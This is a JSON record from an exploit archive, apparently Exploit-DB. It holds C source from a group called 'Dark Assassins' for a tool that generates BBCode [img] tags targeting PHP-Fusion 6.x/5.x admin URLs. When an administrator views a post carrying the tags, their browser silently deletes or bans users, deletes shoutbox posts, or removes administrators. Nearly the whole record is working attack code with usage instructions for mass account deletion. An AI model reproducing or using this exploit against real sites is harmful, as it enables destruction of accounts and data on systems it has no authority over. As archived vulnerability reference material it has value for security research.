{
  "id": "1135",
  "title": "PHP-Fusion 6.0.106 - BBCode IMG Tag Script Injection",
  "cve": null,
  "vuln_type": "unknown",
  "code": "/* \r\n\r\nahh I was hoping for some socket code :( /str0ke\r\n\r\nDark Assassins - http://dark-assassins.com/\r\nVisit us on IRC @ irc.tddirc.net #DarkAssassins\r\n\r\nPHP-Fusion [img][/img] exploit\r\n\r\nDiscovered/Coded by Easyex\r\n\r\nUsing the [img] [/img] codes we can get an administrator to do a function a normal member cannot do.\r\n\r\nFor example..\r\n\r\n[img]/administration/members.php?step=delete&sortby=all&rowstart=0&user_id=1[/img]\r\n\r\nThis could be in our signature, forum post or in a comment post. When an admin views the page with the malicious code it will automatically load and do the function we selected. In the example it would delete the shout box post with the id 1.\r\n\r\nBecause we are using the [img] [/img] code it just shows up as an invalid image.\r\n\r\nCode usage:\r\n\r\n./fusionimg <version> <dir> deluser <start> <end>\r\n./fusionimg <version> <dir> banuser <start> <end>\r\n./fusionimg <version> <dir> delshout <start end>\r\n./fusionimg <version> <dir> deladmin <start end>\r\n\r\n<version> is the PHP-Fusion version. enter 6.x or 5.x depending on the version number.\r\n\r\n<start> is the start point of user id(s)\r\n<end> is the end point of the user id(s)\r\n \r\nSo if we had a vulnerable host running PHP Fusion v6.00.106 or below with say 150 users and we wanted to delete them all we would type ./fusionimg 6.x / deluser 1 150 or if we wanted to delete 1 user that had the id: 5 we would type: ./fusionimg 6.x / deluser 5 5\r\n\r\n*/\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n\r\n   int usage() {\r\n      printf(\"Usage: ./fusionimg <version> <dir> <option> <start> <end>\\n\");\r\n      printf(\"Example: ./fusionimg 6.x / deluser 1 500\\n\");\r\n      exit(1);\r\n   }\r\n\r\n   int main (int argc, char *argv[]) {\r\n   \r\n   printf(\"\\n\");\r\n   printf(\"PHP-Fusion [img][/img] exploit\\n\");\r\n   printf(\"Coded by Easyex from the Dark Assassins crew\\n\\n\");\r\n   \r\n   if(argc < 6 )\r\n      usage();\r\n          \r\n   int i;\r\n   char cmd[512];\r\n   char option[512];\r\n   char version[512];    \r\n   \r\n   FILE *log;\r\n   log = fopen(\"exploit.txt\", \"w+\");\r\n\r\n   if(log == 0) {\r\n      printf(\"[-] Error opening log file.\\n\");\r\n      exit(-1);;              \r\n   }\r\n   \r\n   fprintf(log, \"PHP-Fusion [img][/img] exploit\\n\");\r\n   fprintf(log, \"Discovered/Coded by Easyex\\n\\n\");\r\n   \r\n   if(strcmp(argv[1], \"6.x\") == 0) {\r\n      strncpy(version, \"administration/\", 512);\r\n   }\r\n \r\n   else if(strcmp(argv[1], \"5.x\") == 0) {\r\n      strncpy(version, \"fusion_admin/\", 512);\r\n   }\r\n   \r\n   else {\r\n      printf(\"[-] Error, Invalid version!\\n\");\r\n      exit(-1);;\r\n   }      \r\n   \r\n   // There are other options you can do, This is just some of them...\r\n   \r\n   // If you need to find out a users id you can just go to members.php and click on the user you want and the id will show in the url like ?lookup=1     \r\n      \r\n   if(strcmp(argv[3], \"deluser\") == 0) {\r\n      strncpy(option, \"members.php?step=delete&sortby=all&rowstart=0&user_id=\", 512);\r\n      fprintf(log, \"You have selected to delete %s > %s user(s)\\n\", argv[4], argv[5]);\r\n   }\r\n    \r\n   else if(strcmp(argv[3], \"banuser\") == 0) {\r\n      strncpy(option, \"members.php?step=ban&act=on&sortby=all&rowstart=0&user_id=\", 512);\r\n      fprintf(log, \"You have selected to ban %s > %s user(s)\\n\", argv[4], argv[5]);\r\n   }\r\n\r\n   else if(strcmp(argv[3], \"delshout\") == 0) {\r\n      strncpy(option, \"shoutbox.php?action=delete&shout_id=\", 512);\r\n      fprintf(log, \"You have selected to delete %s > %s shoutbox post(s)\\n\", argv[4], argv[5]);\r\n   }\r\n\r\n   // We can delete any account, But we cant add admin accounts\r\n      \r\n   else if(strcmp(argv[3], \"deladmin\") == 0) {\r\n      strncpy(option, \"administrators.php?remove=\", 512);\r\n      fprintf(log, \"You have selected to delete %s > %s administator(s)\\n\", argv[4], argv[5]);\r\n   }   \r\n      \r\n   else {\r\n      printf(\"[-] Error, Invalid option!\\n\");\r\n      exit(-1);\r\n   }\r\n      \r\n   printf(\"[+] Generating image codes...\\n\\n\");\r\n   \r\n   fprintf(log, \"Add the following lines of code into your signature, forum post or in a comment post:\\n\\n\");\r\n       \r\n   for (i = atoi(argv[4]); i <= atoi(argv[5]); i++) {\r\n      sprintf(cmd, \"[img]%s%s%s%d[/img]\", argv[2], version, option, i);\r\n      fprintf(log, \"%s\\n\", cmd);\r\n   }\r\n   \r\n   printf(\"[+] Completed & logged to exploit.txt\\n\");\r\n   exit(1);   \r\n}\r\n\r\n// milw0rm.com [2005-08-05]",
  "url": "https://www.exploit-db.com/exploits/1135"
}